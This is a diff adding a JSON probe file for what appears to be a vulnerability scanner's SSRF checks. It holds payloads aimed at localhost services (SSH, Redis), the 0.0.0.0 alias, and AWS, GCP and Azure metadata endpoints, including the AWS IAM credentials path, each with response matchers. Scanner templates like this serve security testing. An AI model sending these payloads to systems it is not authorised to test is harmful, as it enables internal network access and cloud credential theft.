@@ -1,0 +1,109 @@
+{
+  "category": "ssrf",
+  "contexts": {
+    "internal": {
+      "description": "SSRF probes targeting internal network resources and localhost services",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1/",
+          "description": "SSRF to localhost root — length diff indicates internal content served",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:22/",
+          "description": "SSRF to localhost SSH port — SSH banner in response confirms internal reach",
+          "matchers": [
+            {"type": "word", "words": ["ssh", "refused", "OpenSSH"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:6379/",
+          "description": "SSRF to localhost Redis — Redis error banner confirms internal reach",
+          "matchers": [
+            {"type": "word", "words": ["-ERR", "NOAUTH", "redis"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "http://0.0.0.0/",
+          "description": "SSRF via 0.0.0.0 alias for localhost bypass",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{callback}}",
+          "description": "Out-of-band SSRF detection via collaborator callback URL",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "cloud_metadata": {
+      "description": "SSRF probes targeting cloud provider metadata endpoints (AWS, GCP, Azure)",
+      "tech_match": ["AWS", "GCP", "Azure"],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "description": "AWS IMDSv1 metadata endpoint — ami-id or instance-id confirms SSRF to AWS metadata",
+          "matchers": [
+            {"type": "word", "words": ["ami-id", "instance-id", "iam"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "AWS IAM credentials endpoint — role name in response reveals attached IAM role",
+          "matchers": [
+            {"type": "regex", "pattern": "[A-Za-z0-9_-]{1,64}"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/",
+          "description": "GCP metadata endpoint — requires Metadata-Flavor header bypass",
+          "matchers": [
+            {"type": "word", "words": ["instance", "project"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "description": "Azure IMDS endpoint — compute details confirm Azure SSRF",
+          "matchers": [
+            {"type": "word", "words": ["subscriptionId", "resourceGroupName", "vmId"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
